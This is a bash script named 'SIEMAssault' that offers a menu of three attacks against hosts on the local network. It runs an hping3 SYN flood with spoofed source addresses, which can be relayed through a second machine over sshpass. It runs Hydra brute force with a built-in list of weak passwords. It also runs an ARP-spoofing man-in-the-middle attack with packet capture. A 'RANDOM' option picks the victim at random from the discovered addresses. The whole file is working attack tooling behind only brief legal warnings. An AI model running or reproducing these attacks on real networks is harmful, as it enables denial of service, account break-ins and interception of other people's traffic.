#!/bin/bash



# Colors for the script
RED=$(tput bold ;tput setaf 88)
ARK_GREEN_BOLD=$(tput bold; tput setaf 22)
ORANGE_BOLD=$(tput bold; tput setaf 208)
BLUE_BOLD=$(tput bold; tput setaf 27)
RED_BOLD=$(tput bold; tput setaf 1)
DARK_RED_BOLD=$(tput bold; tput setaf 52)
YELLOW_BOLD=$(tput bold; tput setaf 3)
WHITE_BOLD=$(tput bold; tput setaf 231)


function INSTALL_FIGLET_DDOS() {
    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet DDOS :0)"
}

function INSTALL_FIGLET_BRUTE() {
    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet BRUTE Force :0)"
}

function INSTALL_FIGLET_MITM() {
    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet MITM attack :0)"
}

function INSTALL_FIGLET_START() {
    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet SIEMAssault :0)"
}

#Descrption for the DDOS attack
function DESCRPTION_DDOS() {

    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet Description)"
    echo -e "${RED}$(figlet DDOS :0)"
    
    echo -e "${ARK_GREEN_BOLD}[*]DDoS Attack Description:"
    echo -e "${ORANGE_BOLD}This tool slows down or blocks access to a computer or website."
    echo -e "It uses hping3 to flood the target with fake data and nmap to find potential victims."
    echo -e "You can choose to attack from one or two computers, but remember—it's illegal."
    echo -e "Use this tool responsibly and be aware of legal consequences."
    echo -e "Always prioritize ethical use of such tools."


    while true; do
        echo -e ""
        read -rp "${WHITE_BOLD}[?] Would you like to continue the DDOS attack? (yes/no):"  CHOSE
        case $CHOSE in
            [Yy]es)
                clear -x
                INSTALL_FIGLET_DDOS
                ATTACKS_DDOS 
                exit 1;;
            [Nn]o)
                #Repeating the question what attack would you like?
                clear -x
                TYPE_ATTACK
                exit;;
            *)
                # Display error message for invalid input
                echo "${RED_BOLD}[-] Invalid input. Please enter 'yes' or 'no'."
        esac
    done




}

#Descrption of BRUTEe forec attack 
function DESCRPTION_BRUTE_FORCE() {

    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet Description)"
    echo -e "${RED}$(figlet Brute Force :0)"
    
    echo -e "${ARK_GREEN_BOLD}[*]Brute Force Attack Description:"

    echo -e "${ORANGE_BOLD}Brute force attack on a specified victim's IP address, discovering available protocols."
    echo -e "Attempts to breach using default or custom credentials, iterating through a list of protocols."
    echo -e "Prompts for user input to proceed with default or custom username and password lists."
    echo -e "Results are saved to Hydra_BRUTE.txt for analysis.${RESET}"



    while true; do
        echo -e ""
        read -rp "${WHITE_BOLD}[?] Would you like to continue the Brute Force attack? (yes/no):"  CHOSE
        case $CHOSE in
            [Yy]es)
                clear -x
                INSTALL_FIGLET_BRUTE
                ATTACK_BRUTE
                exit 1;;
            [Nn]o)
                #Repeating the question what attack would you like?
                clear -x
                TYPE_ATTACK
                exit;;
            *)
                # Display error message for invalid input
                echo "${RED_BOLD}[-] Invalid input. Please enter 'yes' or 'no'."
        esac
    done




}




#Descrption of BRUTEe forec attack 
function DESCRPTION_MITM() {

    # Downloading and using figlet 
    if ! command -v figlet &> /dev/null; then
        sudo apt-get install -y figlet &> /dev/null 
    fi
    echo -e "${RED}$(figlet Description)"
    echo -e "${RED}$(figlet MITM Attack :0)"
    
    echo -e "${ARK_GREEN_BOLD}[*]MITM Attack Description:"

    echo -e "${ORANGE_BOLD}Initiates a Man-In-The-Middle (MITM) attack, intercepting network traffic.${RESET}"
    echo -e "Allows selection of victim's IP address manually or randomly from LAN network."
    echo -e "Enables user to choose network interface and starts packet capture for analysis."
    echo -e "Press ${RED_BOLD}CTRL+C${RESET} to ${RED_BOLD}STOP${RESET} the attack.${RESET}"




    while true; do
        echo -e ""
        read -rp "${WHITE_BOLD}[?] Would you like to continue the MITM attack? (yes/no):"  CHOSE
        case $CHOSE in
            [Yy]es)
                clear -x
                INSTALL_FIGLET_MITM
                MITM_ATTACK
                exit 1;;
            [Nn]o)
                #Repeating the question what attack would you like?
                clear -x
                TYPE_ATTACK
                exit;;
            *)
                # Display error message for invalid input
                echo "${RED_BOLD}[-] Invalid input. Please enter 'yes' or 'no'."
        esac
    done




}



#Download the necessary application for the DDOS attack
function INSTALL_DDOS {

    if ! command -v hping3 &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Hping3....${RESET}"
        sudo apt-get install -y hping3 &>/dev/null
    fi

    if ! command -v nmap &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Nmap....${RESET}"
        sudo apt-get install -y nmap &>/dev/null
    fi

        if ! command -v sshpass &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Sshpass....${RESET}"
        sudo apt-get install -y sshpass &>/dev/null
    fi


     if ! command -v ipcalc &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Sshpass....${RESET}"
        sudo apt-get install -y ipcalc &>/dev/null
    fi
    echo -e ""
}



#Download the necessary application for the MITM attack
function INSTALL_MITM {

    if ! command -v hping3 &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Hping3....${RESET}"
        sudo apt-get install -y hping3 &>/dev/null
    fi

    if ! command -v tcpdump &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading tcpdump....${RESET}"
         sudo apt-get install -y tcpdump &>/dev/null
    fi


     if ! command -v ipcalc &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Sshpass....${RESET}"
        sudo apt-get install -y ipcalc &>/dev/null
    fi
    echo -e ""
}  


#Download the necessary application for the BRUTE force attack
function INSTALL_BRUTE () {

    if ! command -v hydra &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Hydra....${RESET}"
        sudo apt-get install -y hydra &>/dev/null
    fi

    if ! command -v nmap &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Nmap....${RESET}"
        sudo apt-get install -y nmap &>/dev/null
    fi

    if ! command -v ipcalc &>/dev/null; then 
        echo -e "${GREEN}[@]Downloading Ipcalc....${RESET}"
        sudo apt-get install -y ipcalc &>/dev/null
    fi
    echo -e ""
}

#Function that ask the user what atttack would he like to do.
function TYPE_ATTACK (){

    INSTALL_FIGLET_START
    echo "${ORANGE_BOLD}[*] Which attack would you want to do?"
    echo "${BLUE_BOLD}[1] DDOS"
    echo "${BLUE_BOLD}[2] Brute Force"
    echo "${BLUE_BOLD}[3] MITM Attack"
    echo "${WHITE_BOLD}[4] Random"
    echo -e ""
    
    while true; do
        read -rp "${ORANGE_BOLD}[?] Enter the number corresponding to the attack type: " ATTACK

        case $ATTACK in
            1)
                ATTACK="ddos"
                clear -x
                DESCRPTION_DDOS
                break;;
            2)
                ATTACK="brute force"
                clear -x
                DESCRPTION_BRUTE_FORCE
                break;;
            3)
                ATTACK="mitm attack"
                clear -x
                DESCRPTION_MITM
                break;;
            4)
                RANDOM_ATTACK=$(( (RANDOM % 3) + 1 ))
                case $RANDOM_ATTACK in
                    1)
                        ATTACK="ddos"
                        clear -x
                        DESCRPTION_DDOS
                        break;;
                    2)
                        ATTACK="brute force"
                        clear -x
                        DESCRPTION_BRUTE_FORCE
                        break;;
                    3)
                        ATTACK="mitm attack"
                        clear -x
                        DESCRPTION_MITM
                        break;;
                esac
                ;;
            *)
                echo "${RED_BOLD}[-] Invalid choice. Please enter a number between 1 and 4."
                ;;
        esac
    done
}



function NETWORK_DISPLAY() {

    # Displaying network information
    HOSTNAME=$(hostname -I | awk '{print $1}')
    SUBNET=$(ipcalc -n "$HOSTNAME" | cut -d= -f2)
    IP_SUBNET=$(echo "$SUBNET" | grep -oP 'Network:\s+\K[\d./]+')
    NETWORK_IPS=$(sudo nmap -sn "$IP_SUBNET" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort | uniq | sed 's/^/[/; s/$/]/' | tr '\n' ' ' )

    echo -e ""
    echo "${ORANGE_BOLD}[*] You can also choose IP addresses from your LAN to attack or type RANDOM for a random IP."
    echo "${ORANGE_BOLD}[*] Discover IPs in your network:${RESET} ${ARK_GREEN_BOLD}$NETWORK_IPS${RESET}"
    echo ""
}






function ATTACKS_DDOS () {


    if [[ $ATTACK == "ddos" ]]; then
        
        #Install aplication
        INSTALL_DDOS
        echo -e "${ORANGE_BOLD}[*] You can also perform a DDos attack from two different computers if you have a username and password."
        echo -e "${ORANGE_BOLD}[*] Note: This only works with port 22 SSH."


        # Input validation for yes/no answer
        while true; do
            read -rp "${WHITE_BOLD}[?] Would you like to perform the attack from two computers? If yes, enter (yes/no)':" PROXY
            case $PROXY in
                [Yy]es)
                    break;;
                [Nn]o)
                    break;;
                *)
                    echo "${RED_BOLD}[-] Invalid answer Please enter (yes/no)."

            esac
        done

        if [[ $PROXY == "yes" ]]; then
            echo "${ORANGE_BOLD}[*] Performing DDos attack from two computers..."
            echo -e ""

            # Input validation for IP address of the proxy computer
            while true; do
                read -rp "${WHITE_BOLD}[?] Please enter the IP address of the proxy computer:" IP_PROXY
                if [[ $IP_PROXY =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    break
                else
                    echo "${RED_BOLD}[-] Invalid IP address. Please enter a valid IP address."
                fi
            done

            read -rp "${WHITE_BOLD}[?] Enter the username: " USERNAME_PROXY
            read -rp "${WHITE_BOLD}[?] Enter the password: " PASSWORD_PROXY

            while true; do
                #Display the network ips for you to chhos optional
                NETWORK_DISPLAY
                read -rp "${WHITE_BOLD}[?] Please enter the IP address of the Victim: " IP_DDOS
                if [[ $IP_DDOS =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    break
                elif [[ $IP_DDOS == "RANDOM" ]]; then
                    RANDOM_INDEX=$(( RANDOM % 5 ))
                    IP_DDOS=$(echo "$NETWORK_IPS" | awk '{print $'$RANDOM_INDEX'}')
                    echo "${ORANGE_BOLD}[*] Random IP selected: '$IP_DDOS'"
                    break
                else
                    echo "${RED_BOLD}[-] Invalid IP address. Please enter a valid IP address or type RANDOM for a random IP."
                fi
            done

            read -rp "${WHITE_BOLD}[?] Enter duration of DDOS attack in seconds: " DURATION
            echo -e ""
            echo -e "${ORANGE_BOLD}[*] Starting Nmap to discover ports."
            TARGET_PORT=$(sudo nmap -sS -Pn "$IP_DDOS" | grep '^ *[0-9]*/tcp' | awk -F/ '{printf "%s,",$1}' | sed 's/,$//') &>/dev/null
          

            #if found port then attack with this port if port dosent found attack the ip address.
            if [ -n "$TARGET_PORT" ]; then
                echo -e "${ORANGE_BOLD}[*] Found ports are: $TARGET_PORT"

                # Input validation for ports
                while true; do
                    read -rp "${WHITE_BOLD}[?] Enter the port(s) you want to DDOS separated by commas (e.g., 21,22,80,3389), or \'all\' for all ports: " PORTS_HPING3
                    if [[ $PORTS_HPING3 == "all" ]]; then
                        break
                    elif [[ $PORTS_HPING3 =~ ^[0-9,]+$ ]]; then
                        break
                    else
                        echo "${RED_BOLD}[-] Invalid input. Please enter port(s) separated by commas or \'all\' for all ports."
                    fi
                done

                echo "${ORANGE_BOLD}[*] Starting the DDOS attack."
                # Execute the provided command on the proxy machine using sshpass
                sshpass -p "$PASSWORD_PROXY" ssh -o StrictHostKeyChecking=yes "$USERNAME_PROXY@$IP_PROXY" \
                "echo "$PASSWORD_PROXY" | timeout "$DURATION" sudo -S hping3 --flood --rand-source -S -p "$PORTS_HPING3" "$IP_DDOS";" &>/dev/null

                sudo timeout "$DURATION" sudo hping3 --flood --rand-source -S -p "$TARGET_PORT" "$IP_DDOS" &>/dev/null &


                sleep "$DURATION"
                echo "${ORANGE_BOLD}[*] DDos was successful duration attack "$DURATION"."

            else
                echo -e "${ORANGE_BOLD}[*] No ports found attacking only the ip."
                echo "${ORANGE_BOLD}[*] Starting the DDOS attack."

                # Execute the provided command on the proxy machine using sshpass
                sshpass -p "$PASSWORD_PROXY" ssh -o StrictHostKeyChecking=ask "$USERNAME_PROXY@$IP_PROXY" \
                "echo "$PASSWORD_PROXY" | timeout "$DURATION" sudo -S hping3 --flood --rand-source -S "$IP_DDOS";" &>/dev/null

                sudo timeout "$DURATION" sudo hping3 --flood --rand-source -S "$IP_DDOS" &>/dev/null &


                sleep "$DURATION"
                echo "${ORANGE_BOLD}[*] DDos was successful duration attack "$DURATION"."

            fi


        else
            echo "${ORANGE_BOLD}[*] Performing DDos attack from a single computer..."
            echo -e ""
            
            #Read for the victim ip or random from lan network 
            while true; do
                #Display the network ips for you to chhos optional
                NETWORK_DISPLAY
                read -rp "${WHITE_BOLD}[?] Please enter the IP address of the Victim: " IP_DDOS
                if [[ $IP_DDOS =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    break
                elif [[ $IP_DDOS == "RANDOM" ]]; then
                    RANDOM_INDEX=$(( RANDOM % 5 ))
                    IP_DDOS=$(echo "$NETWORK_IPS" | awk '{print $'$RANDOM_INDEX'}')
                    echo "${ORANGE_BOLD}[*] Random IP selected: $IP_DDOS"
                    break
                else
                    echo "${RED_BOLD}[-] Invalid IP address. Please enter a valid IP address or type RANDOM for a random IP."
                fi
            done


            read -rp "${WHITE_BOLD}[?] Enter duration of DDOS attack in seconds: " DURATION

            echo -e ""
            echo -e "${ORANGE_BOLD}[*] Starting Nmap to discover ports."
            TARGET_PORT=$(sudo nmap -sS -Pn "$IP_DDOS" | grep '^ *[0-9]*/tcp' | awk -F/ '{printf "%s,",$1}' | sed 's/,$//') &>/dev/null
           


            #if found port then attack with this port if port dosent found attack the ip address.
            if [ -n "$TARGET_PORT" ]; then
                echo -e "${ORANGE_BOLD}[*] Found ports are: $TARGET_PORT"
                while true; do
                    read -rp "${WHITE_BOLD}[?] Enter the port(s) you want to DDOS separated by commas (e.g., 21,22,80,3389), or \'all\' for all ports: " PORTS_HPING3
                    if [[ $PORTS_HPING3 == "all" ]]; then
                        break
                    elif [[ $PORTS_HPING3 =~ ^[0-9,]+$ ]]; then
                        break
                    else
                        echo "${RED_BOLD}[-] Invalid input. Please enter port(s) separated by commas or \'all\' for all ports."
                    fi
                done
                echo -e ""
                echo  -e "${ORANGE_BOLD}[*] Starting the DDOS attack."
                sleep 1 
                sudo timeout "$DURATION" sudo hping3 --flood --rand-source -S -p "$TARGET_PORT" "$IP_DDOS" &>/dev/null &
                sleep "$DURATION"
                echo "${ORANGE_BOLD}[*] DDos was successful duration attack "$DURATION"." 
                 
            else    
                echo -e "${ORANGE_BOLD}[*] No ports found attacking only the ip."
                sleep 1
                echo -e ""
                echo  -e "${ORANGE_BOLD}[*] Starting the DDOS attack."
                sleep 1
                sudo timeout "$DURATION" sudo hping3 --flood --rand-source -S "$IP_DDOS" &>/dev/null &
                sleep "$DURATION"
                echo "${ORANGE_BOLD}[*] DDos was successful duration attack "$DURATION"."
               
            fi
            
        fi
    else
       exit 1 
   
    fi
}



function ATTACK_BRUTE {

    if [[ $ATTACK == "brute force" ]]; then

        # Read for the victim IP or random from the LAN network
        while true; do
             #Installing applictions
            INSTALL_BRUTE
            # Display the network IPs for you to choose (optional)
            NETWORK_DISPLAY
            read -rp "${WHITE_BOLD}[?] Please enter the IP address of the Victim: ${RESET}" IP_BRUTE
            if [[ $IP_BRUTE =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                break
            elif [[ $IP_BRUTE == "RANDOM" ]]; then
                RANDOM_INDEX=$(( RANDOM % 5 ))
                IP_BRUTE=$(echo "$NETWORK_IPS" | awk '{print $'$RANDOM_INDEX'}')
                echo "${ORANGE_BOLD}[*] Random IP selected: $IP_BRUTE${RESET}"
                break
            else
                echo "${RED_BOLD}[-] Invalid IP address. Please enter a valid IP address or type RANDOM for a random IP.${RESET}"
            fi
        done


            echo -e ""
            echo -e "${ORANGE_BOLD}[*] Starting Nmap to discover protocols.${RESET}"
            # Remove square brackets from the IP addresses
            IP_BRUTE=$(echo "$IP_BRUTE" | tr -d '[]')
            TARGET_NAMEDPORT=$(sudo nmap -sS -Pn "$IP_BRUTE" | awk '/\/tcp/{printf "%s%s", sep, $3; sep=","}' )
            if [[ -z $TARGET_NAMEDPORT ]]; then
                echo "${RED_BOLD}[-] No open ports found on the target. Exiting.${RESET}"
                exit 1
            fi
            echo "${ORANGE_BOLD}[*] Found Protocols are: $TARGET_NAMEDPORT${RESET}"



        # Input validation for protocols
        while true; do
            read -rp "${WHITE_BOLD}[?] Enter the protocol(s) you want to BRUTE_Force (e.g., ssh,ftp,rdp...), or 'all' for all protocols: ${RESET}" PROTOCOLS_BRUTE
            if [[ $PROTOCOLS_BRUTE == "all" ]]; then
                PROTOCOLS=$(echo "$TARGET_NAMEDPORT" | cut -d' ' -f3- | tr ' ' '\n')  # Extract protocols from the Nmap output
                break
            elif [[ $PROTOCOLS_BRUTE =~ ^([a-zA-Z]+,?)+$ ]]; then
                PROTOCOLS=$(echo "$PROTOCOLS_BRUTE" | tr ',' '\n')  # Split protocols by comma
                break
            else
                echo "${RED_BOLD}[-] Invalid input. Please enter protocol(s) separated by commas or 'all' for all protocols.${RESET}"
            fi
        done

        while true; do
            echo -e ""
            read -rp "${ORANGE_BOLD}[?] Would you like to use default password and username list (yes/no)? ${RESET}" DEFAULT

            if [[ $DEFAULT == "yes" ]]; then
                echo "${ORANGE_BOLD}[*] Using default user and password list. BRUTEe force start...${RESET}"
        
                USERS=("kali" "root" "user" "admin" "msfadmin")
                PASSWORDS=("kali" "123456" "admin" "letmein" "msfadmin" "qwerty" "123456789" "abc123" "111111" "123123" "admin123" "admin@123" "rotem999999" "rotem1234" "admin@1234" "Smolikn123" "adminadmin@123" "admin12345" "admin@12345" "adminadmin12345" "adminadmin@12345" "password123" "password@123" "password1234" "yesbabe@1234" "touchme12345" "yesyes@12345")

                # Save usernames to /tmp/Users.txt
                for user in "${USERS[@]}"; do
                    echo "$user" >> /tmp/Users.txt
                done

                # Save passwords to /tmp/Password.txt
                for password in "${PASSWORDS[@]}"; do
                    echo "$password" >> /tmp/Password.txt
                done

                # Run Hydra with the saved usernames and passwords
                for PROTOCOL in $(echo "$PROTOCOLS" | tr ',' '\n'); do
                    echo "${ORANGE_BOLD}[*] Running Hydra for protocol: $PROTOCOL${RESET}"
                    sudo hydra -L "/tmp/Users.txt" -P "/tmp/Password.txt" "$PROTOCOL://$IP_BRUTE" >> /var/log/Hydra_Brute.log 2>/dev/null
                    echo "${ORANGE_BOLD}[*] The data was saved in /var/log/Hydra_Brute.log${RESET}"
                done
                
                sudo rm /tmp/Password.txt
                sudo rm /tmp/Users.txt
       
                break

            elif [[ $DEFAULT == "no" ]]; then
                read -rp "${WHITE_BOLD}[?] Enter the full path of the user list file: ${RESET}" USER_FILE
                read -rp "${WHITE_BOLD}[?] Enter the full path of the password list file: ${RESET}" PASSWORD_LIST

                for PROTOCOL in $PROTOCOLS; do
                    echo "${ORANGE_BOLD}[*] Running Hydra for protocol: $PROTOCOL${RESET}"
                    sudo hydra -L "$USER_FILE" -P "$PASSWORD_LIST" -f "$PROTOCOL://$IP_BRUTE" >> /var/log/Hydra_Brute.log 2>/dev/null
                    echo "${ORANGE_BOLD}[*] The data was saved in /var/log/Hydra_Brute.log${RESET}"
                done
                break
            else
                echo "${RED_BOLD}[-] Invalid input. Please enter 'yes' or 'no'.${RESET}"
            fi
        done
    fi
}


function MITM_ATTACK {

    # Function to stop background processes
    function  stop_background_processes() {

        echo "${ORANGE_BOLD}[*]Stopping background processes...${RESET}"
        sudo pkill -f arpspoof
        sudo pkill -f tcpdump
        sudo sh -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
        exit 0
    }

    # Trap Ctrl+C to stop background processes
    trap stop_background_processes SIGINT 

    if [[ $ATTACK == "mitm attack" ]]; then
        
        #Installing application 
        INSTALL_MITM

        # Read for the victim IP or random from the LAN network
        while true; do
            # Display the network IPs for you to choose (optional)
            NETWORK_DISPLAY
            read -rp "${WHITE_BOLD}[?] Please enter the IP address of the Victim: ${RESET}" IP_MITM
            if [[ $IP_MITM =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                break
            elif [[ $IP_MITM == "RANDOM" ]]; then
                RANDOM_INDEX=$(( RANDOM % 5 ))
                IP_MITM=$(echo "$NETWORK_IPS" | awk '{print $'$RANDOM_INDEX'}')
                echo "${ORANGE_BOLD}[*] Random IP selected: ${RESET} $IP_MITM"
                break
            else
                echo "${RED_BOLD}[-] Invalid IP address. Please enter a valid IP address or type RANDOM for a random IP.${RESET}"
            fi
        done

        GATEWAY=$(ip route show | grep default | awk '{print $3}')
        sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
        INTERFACE=$(ip -o link show | awk -F': ' '{printf "[%s] ", $2}')

        echo -e ""
        echo "${ORANGE_BOLD}[*] This is your Interfaces: ${RESET} "$INTERFACE""
        while true; do
            read -rp "${WHITE_BOLD}[?] Enter your chosen interface: ${RESET}" INTERFACE_CHOSEN

            # Check if the chosen interface is in the list of available interfaces
            if [[ "$INTERFACE" =~ .*$INTERFACE_CHOSEN.* ]]; then
                break
            else
                echo "${RED_BOLD}[-] Error: Interface not found. Please choose from the available interfaces.${RESET}"
                echo -e ""
            fi
        done

        echo "${ORANGE_BOLD}[*] Your gateway is: ${RESET} "${WHITE_BOLD}$GATEWAY${RESET}""
        echo "${ORANGE_BOLD}[*] The PCAP from the attack will be save in current direcotry named:${RESET}${WHITE_BOLD}MITM_attack.pcap${RESET}"
        echo "${ORANGE_BOLD}[*] MITM attack start.${RESET}"
        echo ""

        # Start tcpdump to capture packets in the background
        sudo tcpdump -i "$INTERFACE_CHOSEN" -w MITM_attack.pcap >/dev/null 2>&1 &

        echo -e ""
        echo "${ORANGE_BOLD}[*] Press ${RESET}${RED_BOLD}CTRL+C${RESET} ${ORANGE_BOLD}to${RESET} ${RED_BOLD}STOP${RESET} ${ORANGE_BOLD}the MITM ATTACK${RESET}"

        # Execute arpspoof command
        arpspoof -i "$INTERFACE_CHOSEN" -t "$IP_MITM" "$GATEWAY"
       

    else
        exit 1
    fi


}







#Start the script <3
TYPE_ATTACK
